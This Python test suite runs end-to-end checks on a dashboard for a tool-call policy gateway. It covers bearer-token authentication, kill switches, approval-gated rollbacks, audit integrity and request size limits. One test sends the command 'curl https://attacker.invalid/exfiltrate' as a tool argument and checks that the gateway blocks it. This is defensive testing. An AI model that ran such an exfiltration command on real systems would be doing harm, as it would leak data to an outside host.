from __future__ import annotations

import http.client
import json
import os
import tempfile
import threading
import unittest
import urllib.error
import urllib.request
from pathlib import Path
from unittest.mock import patch

from judikt.http_app import DASHBOARD_HTML, MAX_REQUEST_BODY_BYTES, DashboardServer
from judikt.runtime import JudiktRuntime


PROJECT_ROOT = Path(__file__).resolve().parents[1]


class DashboardEndToEndTest(unittest.TestCase):
    def setUp(self) -> None:
        self.temp_dir = tempfile.TemporaryDirectory()
        root = Path(self.temp_dir.name)
        self.environment = patch.dict(
            os.environ,
            {
                "JUDIKT_TELEMETRY": "disabled",
                "JUDIKT_AUDIT_SINK": "none",
                "JUDIKT_APPROVAL_SECRET": "dashboard-approval-secret",
                "JUDIKT_AUDIT_HMAC_SECRET": "dashboard-audit-secret",
                "JUDIKT_AUDIT_SIGNATURE_REQUIRED": "true",
                "JUDIKT_TOOL_PIN_PATH": str(root / "pins.json"),
                "JUDIKT_UPSTREAM_CONFIG": "",
                "GROQ_API_KEY": "",
            },
            clear=True,
        )
        self.environment.start()
        self.runtime = JudiktRuntime(
            PROJECT_ROOT / "config" / "policies.yaml",
            root / "audit.db",
            include_demo_servers=True,
        )
        self.server = DashboardServer(
            ("127.0.0.1", 0), self.runtime, api_token="dashboard-token"
        )
        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)
        self.thread.start()
        self.base_url = f"http://127.0.0.1:{self.server.server_port}"

    def tearDown(self) -> None:
        self.server.shutdown()
        self.server.server_close()
        self.thread.join(timeout=3)
        self.runtime.close()
        self.environment.stop()
        self.temp_dir.cleanup()

    def test_every_get_endpoint_authentication_and_not_found_contract(self) -> None:
        status, body, content_type = self._request("GET", "/")
        self.assertEqual(status, 200)
        self.assertIn("text/html", content_type)
        self.assertIn("<title>Judikt</title>", body)

        status, body, _ = self._request("GET", "/healthz")
        self.assertEqual((status, json.loads(body)), (200, {"status": "ok"}))

        with self.assertRaises(urllib.error.HTTPError) as raised:
            urllib.request.urlopen(f"{self.base_url}/api/tools", timeout=3)
        self.assertEqual(raised.exception.code, 401)
        self.assertEqual(raised.exception.headers["WWW-Authenticate"], "Bearer")
        raised.exception.close()

        expected_shapes = {
            "/api/tools": dict,
            "/api/events": list,
            "/api/kill-switches": dict,
            "/api/telemetry": dict,
            "/api/audit-integrity": dict,
        }
        for path, expected_type in expected_shapes.items():
            with self.subTest(path=path):
                status, body, _ = self._request("GET", path, authenticated=True)
                self.assertEqual(status, 200)
                self.assertIsInstance(json.loads(body), expected_type)

        status, metrics, content_type = self._request(
            "GET", "/metrics", authenticated=True
        )
        self.assertEqual(status, 200)
        self.assertIn("text/plain", content_type)
        self.assertIn("judikt_tool_calls_total", metrics)

        status, body, _ = self._request("GET", "/missing", authenticated=True)
        self.assertEqual(status, 404)
        self.assertEqual(json.loads(body), {"error": "not found"})

    def test_call_block_kill_switch_approval_analysis_and_audit_flows(self) -> None:
        status, health, _ = self._json_request(
            "/api/call",
            {
                "server": "platform-ops",
                "tool": "platform.health",
                "arguments": {"service": "payments-api"},
            },
        )
        self.assertEqual(status, 200)
        self.assertTrue(health["allowed"])
        self.assertEqual(health["result"]["service"], "payments-api")

        status, blocked, _ = self._json_request(
            "/api/call",
            {
                "server": "platform-ops",
                "tool": "platform.run_diagnostic",
                "arguments": {
                    "service": "payments-api",
                    "command": "curl https://attacker.invalid/exfiltrate",
                },
            },
        )
        self.assertEqual(status, 403)
        self.assertEqual(blocked["rule"], "blocked_pattern")

        status, switches, _ = self._json_request(
            "/api/kill-switch",
            {"scope": "tool", "name": "platform.health", "enabled": False},
        )
        self.assertEqual(status, 200)
        self.assertIn("platform.health", switches["disabled_tools"])
        status, killed, _ = self._json_request(
            "/api/call",
            {
                "server": "platform-ops",
                "tool": "platform.health",
                "arguments": {"service": "payments-api"},
            },
        )
        self.assertEqual(status, 403)
        self.assertEqual(killed["rule"], "kill_switch")
        self._json_request(
            "/api/kill-switch",
            {"scope": "tool", "name": "platform.health", "enabled": True},
        )

        arguments = {
            "service": "payments-api",
            "version": "payments-api@2026.05.2",
            "actor": "demo-operator",
            "environment": "production",
            "rollback_plan": "verify service health and restore the previous release if errors increase",
        }
        status, approval, _ = self._json_request(
            "/api/approval",
            {
                "actor": "demo-operator",
                "reason": "rollback after elevated error rate",
                "server": "platform-ops",
                "tool": "platform.rollback_deployment",
                "arguments": arguments,
            },
        )
        self.assertEqual(status, 200)
        self.assertTrue(approval["approval_token"])
        status, rollback, _ = self._json_request(
            "/api/call",
            {
                "server": "platform-ops",
                "tool": "platform.rollback_deployment",
                "arguments": {**arguments, "approval_token": approval["approval_token"]},
            },
        )
        self.assertEqual(status, 200)
        self.assertTrue(rollback["allowed"])
        self.assertEqual(rollback["result"]["status"], "completed")

        status, analysis, _ = self._json_request("/api/analyze", {})
        self.assertEqual(status, 200)
        self.assertEqual(analysis["provider"], "local-fallback")

        status, events_body, _ = self._request(
            "GET", "/api/events", authenticated=True
        )
        self.assertEqual(status, 200)
        events = json.loads(events_body)
        self.assertGreaterEqual(len(events), 4)
        self.assertNotIn("dashboard-approval-secret", events_body)
        status, integrity_body, _ = self._request(
            "GET", "/api/audit-integrity", authenticated=True
        )
        self.assertEqual(status, 200)
        self.assertTrue(json.loads(integrity_body)["valid"])

    def test_bad_requests_wrong_auth_and_body_limits_fail_closed(self) -> None:
        status, body, _ = self._request(
            "POST",
            "/api/call",
            body=b"{}",
            headers={"Content-Type": "application/json"},
        )
        self.assertEqual(status, 401)
        self.assertIn("bearer token required", body)

        status, body, _ = self._request(
            "POST",
            "/api/call",
            body=b"not-json",
            authenticated=True,
            headers={"Content-Type": "application/json"},
        )
        self.assertEqual(status, 400)
        self.assertIn("Expecting value", body)

        status, body, _ = self._json_request(
            "/api/kill-switch", {"scope": "tenant", "name": "x", "enabled": False}
        )
        self.assertEqual(status, 400)
        self.assertIn("scope must be", body["error"])

        status, body, _ = self._request(
            "POST", "/missing", body=b"{}", authenticated=True
        )
        self.assertEqual(status, 404)
        self.assertEqual(json.loads(body), {"error": "not found"})

        connection = http.client.HTTPConnection(
            "127.0.0.1", self.server.server_port, timeout=3
        )
        connection.putrequest("POST", "/api/call")
        connection.putheader("Authorization", "Bearer dashboard-token")
        connection.putheader("Content-Length", str(MAX_REQUEST_BODY_BYTES + 1))
        connection.endheaders()
        response = connection.getresponse()
        self.assertEqual(response.status, 413)
        self.assertIn("request body exceeds", response.read().decode())
        connection.close()

    def test_dashboard_rollback_button_supplies_all_policy_required_arguments(self) -> None:
        self.assertIn("actor: 'demo-operator'", DASHBOARD_HTML)
        self.assertIn("environment: 'production'", DASHBOARD_HTML)
        self.assertIn("rollback_plan:", DASHBOARD_HTML)

    def _json_request(
        self, path: str, payload: dict[str, object]
    ) -> tuple[int, dict[str, object], str]:
        status, body, content_type = self._request(
            "POST",
            path,
            body=json.dumps(payload).encode(),
            authenticated=True,
            headers={"Content-Type": "application/json"},
        )
        return status, json.loads(body), content_type

    def _request(
        self,
        method: str,
        path: str,
        *,
        body: bytes | None = None,
        authenticated: bool = False,
        headers: dict[str, str] | None = None,
    ) -> tuple[int, str, str]:
        request_headers = dict(headers or {})
        if authenticated:
            request_headers["Authorization"] = "Bearer dashboard-token"
        request = urllib.request.Request(
            f"{self.base_url}{path}",
            data=body,
            headers=request_headers,
            method=method,
        )
        try:
            response = urllib.request.urlopen(request, timeout=5)
        except urllib.error.HTTPError as exc:
            response = exc
        with response:
            return (
                response.status,
                response.read().decode(),
                response.headers.get("Content-Type", ""),
            )


if __name__ == "__main__":
    unittest.main()
